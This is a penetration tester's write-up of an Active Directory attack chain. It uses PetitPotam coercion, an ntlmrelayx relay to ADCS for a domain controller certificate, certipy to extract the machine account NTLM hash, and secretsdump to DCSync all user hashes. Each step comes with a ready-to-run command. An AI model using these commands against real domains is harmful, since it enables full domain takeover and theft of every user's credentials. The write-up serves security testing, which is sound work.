# Active Directory Certificate Services (ADCS) Petitpotam and ntlmrelayx to Domain Admin

# Background

I was on a recent engagement in a large AD environment of a large corporate business. There was a number of domain controllers, along with seperate ADCS servers used for signing and assigning certificates within the domain. This attack path used petitpotam (CVE-2021-36942) to coerce a domain controller within the active directory environment into authenticating with it's machine account - E.G DC1$ - to an attacker-controlled Kali Linux instance. Ntlmrelayx was then used to relay the machine account authentication to the ADCS server within the environment, in order to obtain a certificte for the domain controller machine account. This could then be used to either generate a kerberos ticket or to extract the machine account NTLM hash to dcsync a domain controller within the environment.

# Steps to replicate

## Find ADCS server

The first step is to find the ADCS server(s) within the domain, this may reside on a domain controller, or on a seperate server instance. Certipy "https://github.com/ly4k/Certipy" can be used to find ADCS server details with the following command:

```shell
certipy.py find 'domain.local/<username>:<password>@<adcs-server.domain.local>'

```
The command takes an active directory username/password to identify any ADCS servers and displays associated details, such as CA name and any templates that are available. Furthermore, if you have access to a Windows host, you would only need to run `certutil.exe` to gather the same information.

If you do not have credentials, running an nmap scan against hosts within the domain may reveal servers that have hostnames with "CA" or "cert" in the title. Moreover, the service may be running on a domain controller, so it would be wise to try against the DC in that scenario.

## Start impacket's ntlmrelayx

On Kali Linux (or any similar distribution), run Impacket's ntlmrelayx with the following command in a terminal window:

```shell
ntlmrelayx.py --target http://<adcs-server.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
```
This will start ntlmrelayx listening for authentication requests on the attacker-controlled machine.

## Petitpotam - coerce domain controller

Next, use petitpotam.py "https://github.com/topotam/PetitPotam" to coerce the domain controller into authenticating to the attacker-controlled machine running ntlmrelayx:

```shell
python3 petitpotam.py <attacker-controlled-IP Address> <domain-controller-IP Address>
```

You may need to attempt this a couple of times for petitpotam.py to work, however once it has been run, ntlmrelayx will relay the authentication data to the ADCS server within the domain environment. If successful, the terminal output of ntlmrelayx should show a base64 encoded certificate of the domain controllers machine account.

It is best at this point to save the base64 representation of the machine account certificate to a file `DC1-machine-account.pfx.b64` then decode the data, to leave the raw pfx certificate:

```shell
cat DC1-machine-account.pfx.b64 | base64 -d > DC1-machine-account.pfx
```

## Extracting the domain controller machine account NTLM hash

From here, certipy can be used to extract the machine account from the pfx file generated above `DC1-machine-account.pfx`:

```shell
certipy auth -pfx DC1-machine-account.pfx -user '<machine account username>' -dc-ip <domain-controller-IP-address> -domain <domain name>
```

Noting that the "user" needs to be supplied with the machine account username, for example if the domain controller was named "DC1", the machine account would be "DC1$".

The command will output the NTLM hash for the domin contoller machine account, which can then be used with impackets secretsdump.py to dcsync the domain, in order to retrieve all user hashes:

```shell
secretsdump.py -hashes :<NTLM-HASH> -just-dc <domain name>/DC01\$@<domain-controller-IP-address>
```
Again noting the machine account must be supplied within the command as the user WITHOUT a password.


